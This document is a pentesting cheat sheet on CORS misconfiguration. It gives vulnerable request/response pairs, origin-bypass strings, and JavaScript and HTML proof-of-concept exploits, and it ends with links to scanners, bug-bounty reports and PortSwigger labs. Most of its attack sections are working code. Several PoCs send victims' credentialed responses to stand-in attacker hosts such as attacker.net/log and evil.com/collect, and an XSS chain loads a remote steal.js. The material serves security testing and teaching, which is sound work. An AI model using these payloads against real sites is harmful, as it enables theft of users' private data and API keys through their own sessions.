# CORS Misconfiguration

> Cross-Origin Resource Sharing (CORS) Misconfiguration is a web security vulnerability that occurs when a web application improperly configures its CORS policy, allowing unauthorized domains to access sensitive resources. This can lead to data theft, account compromise, and unauthorized actions.

## Summary

- [Requirements](#requirements)
- [Methodology](#methodology)
    - [Origin Reflection](#origin-reflection)
    - [Null Origin](#null-origin)
    - [XSS on Trusted Origin](#xss-on-trusted-origin)
    - [Wildcard Origin without Credentials](#wildcard-origin-without-credentials)
    - [Expanding the Origin](#expanding-the-origin)
- [Bypass Techniques](#Bypass-Techniques)
    - [Origin Manipulation](#Origin-Manipulation)
    - [Null Origin Bypass](#Null-Origin-Bypass)
    - [Regex Bypass](#Regex-Bypass)
    - [Wildcard Bypass](#wildcard-Bypass)
    - [XSS to CORS Chain](#XSS-to-CORS-Chain)
- [Tools](#tools)
- [References](#references)
- [Resources](#resources)
- [Labs](#Labs)


## Requirements

* BURP HEADER> `Origin: https://evil.com`
* VICTIM HEADER> `Access-Control-Allow-Credential: true`
* VICTIM HEADER> `Access-Control-Allow-Origin: https://evil.com` OR `Access-Control-Allow-Origin: null`

## Methodology

Usually you want to target an API endpoint. Use the following payload to exploit a CORS misconfiguration on target `https://victim.example.com/endpoint`.

### Origin Reflection

#### Vulnerable Implementation

```powershell
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: https://evil.com
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

#### Proof Of Concept

This PoC requires that the respective JS script is hosted at `evil.com`

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://victim.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

or

```html
<html>
     <body>
         <h2>CORS PoC</h2>
         <div id="demo">
             <button type="button" onclick="cors()">Exploit</button>
         </div>
         <script>
             function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
              xhr.open("GET",
                       "https://victim.example.com/endpoint", true);
             xhr.withCredentials = true;
             xhr.send();
             }
         </script>
     </body>
 </html>
```

### Null Origin

#### Vulnerable Implementation

It's possible that the server does not reflect the complete `Origin` header but
that the `null` origin is allowed. This would look like this in the server's
response:

```ps1
GET /endpoint HTTP/1.1
Host: victim.example.com
Origin: null
Cookie: sessionid=... 

HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

#### Proof Of Concept

This can be exploited by putting the attack code into an iframe using the data
URI scheme. If the data URI scheme is used, the browser will use the `null`
origin in the request:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://victim.example.com/endpoint',true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
    location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);
   };
</script>"></iframe> 
```

### XSS on Trusted Origin

If the application does implement a strict whitelist of allowed origins, the
exploit codes from above do not work. But if you have an XSS on a trusted
origin, you can inject the exploit coded from above in order to exploit CORS
again.

```ps1
https://trusted-origin.example.com/?xss=<script>CORS-ATTACK-PAYLOAD</script>
```

### Wildcard Origin without Credentials

If the server responds with a wildcard origin `*`, **the browser does never send
the cookies**. However, if the server does not require authentication, it's still
possible to access the data on the server. This can happen on internal servers
that are not accessible from the Internet. The attacker's website can then
pivot into the internal network and access the server's data without authentication.

```powershell
* is the only wildcard origin
https://*.example.com is not valid
```

#### Vulnerable Implementation

```powershell
GET /endpoint HTTP/1.1
Host: api.internal.example.com
Origin: https://evil.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *

{"[private API key]"}
```

#### Proof Of Concept

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.internal.example.com/endpoint',true); 
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

### Expanding the Origin

Occasionally, certain expansions of the original origin are not filtered on the server side. This might be caused by using a badly implemented regular expressions to validate the origin header.

#### Vulnerable Implementation (Example 1)

In this scenario any prefix inserted in front of `example.com` will be accepted by the server.

```ps1
GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://evilexample.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evilexample.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

#### Proof of Concept (Example 1)

This PoC requires the respective JS script to be hosted at `evilexample.com`

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```

#### Vulnerable Implementation (Example 2)

In this scenario the server utilizes a regex where the dot was not escaped correctly. For instance, something like this: `^api.example.com$` instead of `^api\.example.com$`. Thus, the dot can be replaced with any letter to gain access from a third-party domain.

```ps1
GET /endpoint HTTP/1.1
Host: api.example.com
Origin: https://apiiexample.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://apiiexample.com
Access-Control-Allow-Credentials: true 

{"[private API key]"}
```

#### Proof of concept (Example 2)

This PoC requires the respective JS script to be hosted at `apiiexample.com`

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//attacker.net/log?key='+this.responseText; 
};
```
## Bypass Techniques

### Origin Manipulation
Bypassing origin validation:

- If validation checks for "target.com"

1. Subdomain confusion
```
Origin: https://target.com.evil.com
Origin: https://evil.target.com
```
2. Using @ symbol
```
Origin: https://target.com@evil.com
```
3. Port manipulation
```
Origin: https://target.com:8080
Origin: https://target.com:443
```
4. Protocol variation
```
Origin: http://target.com
Origin: https://target.com
```

### Null Origin Bypass
Exploiting null origin:

1. Sandboxed iframe
```
<iframe sandbox="allow-scripts" srcdoc="
<script>
fetch('https://target.com/api/data', {
  credentials: 'include'
}).then(r => r.json()).then(data => {
  parent.postMessage(data, '*');
});
</script>
"></iframe>
```
2. Data URI
```
<iframe src="data:text/html,
<script>
fetch('https://target.com/api/data', {
  credentials: 'include'
}).then(r => r.json()).then(console.log);
</script>
"></iframe>
```
3. File protocol (local file)
4. Save as file and open in browser

### Regex Bypass
Bypassing regex-based validation:

- If regex checks: /^https?:\/\/[\w.]*target\.com$/

1. Subdomain bypass
```
Origin: https://evil.target.com
Origin: https://target.com.evil.com
```
2. Character injection
```
Origin: https://target.com%0D%0AEvil: header
```
3. Null byte (old systems)
```
Origin: https://target.com%00.evil.com
```
4. Backtick (if not escaped in regex)
```
Origin: https://target`.com.evil.com
```
5. Unicode characters
```
Origin: https://target․com  # Using unicode dot
Origin: https://tаrget.com  # Using Cyrillic 'а'
```

### Wildcard Bypass
Exploiting wildcard configurations:

- Access-Control-Allow-Origin: * is insecure but...
- Can't be used with credentials

1. But if app dynamically sets ACAO:
```
if (origin) {
  response.setHeader('Access-Control-Allow-Origin', origin);
  response.setHeader('Access-Control-Allow-Credentials', 'true');
}
```

2. This reflects any origin - vulnerable!

3. Test with:
```
Origin: https://evil.com
```
4. If reflected with credentials: Vulnerable

### XSS to CORS Chain
Chaining XSS with CORS:

- If CORS blocks external origins
- But XSS exists on subdomain

1. XSS on sub.target.com:
```
<script src="https://evil.com/steal.js"></script>
```
2. steal.js:
```
fetch('https://target.com/api/admin', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  fetch('https://evil.com/collect', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
```
3. Works because request originates from sub.target.com
4. which might be in CORS whitelist
 
## Tools

* [s0md3v/Corsy](https://github.com/s0md3v/Corsy/) - CORS Misconfiguration Scanner
* [chenjj/CORScanner](https://github.com/chenjj/CORScanner) - Fast CORS misconfiguration vulnerabilities scanner
* [@honoki/PostMessage](https://tools.honoki.net/postmessage.html) - POC Builder
* [trufflesecurity/of-cors](https://github.com/trufflesecurity/of-cors) - Exploit CORS misconfigurations on the internal networks
* [omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne) - Fast CORS Misconfiguration Discovery Tool

## References

* [[██████] Cross-origin resource sharing misconfiguration (CORS) - Vadim (jarvis7) - December 20, 2018](https://hackerone.com/reports/470298)
* [Advanced CORS Exploitation Techniques - Corben Leo - June 16, 2018](https://web.archive.org/web/20190516052453/https://www.corben.io/advanced-cors-techniques/)
* [CORS misconfig | Account Takeover - Rohan (nahoragg) - October 20, 2018](https://hackerone.com/reports/426147)
* [CORS Misconfiguration leading to Private Information Disclosure - sandh0t (sandh0t) - October 29, 2018](https://hackerone.com/reports/430249)
* [CORS Misconfiguration on www.zomato.com - James Kettle (albinowax) - September 15, 2016](https://hackerone.com/reports/168574)
* [CORS Misconfigurations Explained - Detectify Blog - April 26, 2018](https://blog.detectify.com/2018/04/26/cors-misconfigurations-explained/)
* [Cross-origin resource sharing (CORS) - PortSwigger Web Security Academy - December 30, 2019](https://portswigger.net/web-security/cors)
* [Cross-origin resource sharing misconfig | steal user information - bughunterboy (bughunterboy) - June 1, 2017](https://hackerone.com/reports/235200)
* [Exploiting CORS misconfigurations for Bitcoins and bounties - James Kettle - 14 October 2016](https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
* [Exploiting Misconfigured CORS (Cross Origin Resource Sharing) - Geekboy - December 16, 2016](https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/)
* [Think Outside the Scope: Advanced CORS Exploitation Techniques - Ayoub Safa (Sandh0t) - May 14 2019](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

## Resources
- [PayloadsAllTheThings/CORS Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CORS%20Misconfiguration)
- [PortSwigger Academy](https://portswigger.net/web-security/cors)
- [NahamSec Course](https://app.hackinghub.io/course)
- [ChatGPT](https://chatgpt.com/)
- [hackviser](https://hackviser.com/tactics/pentesting/web/cors-misconfiguration)
  
## Labs

* [PortSwigger - CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
* [PortSwigger - CORS vulnerability with trusted null origin](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)
* [PortSwigger - CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)
* [PortSwigger - CORS vulnerability with internal network pivot attack](https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack)


* [Think Outside the Scope: Advanced CORS Exploitation Techniques - Ayoub Safa (Sandh0t) - May 14 2019](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)
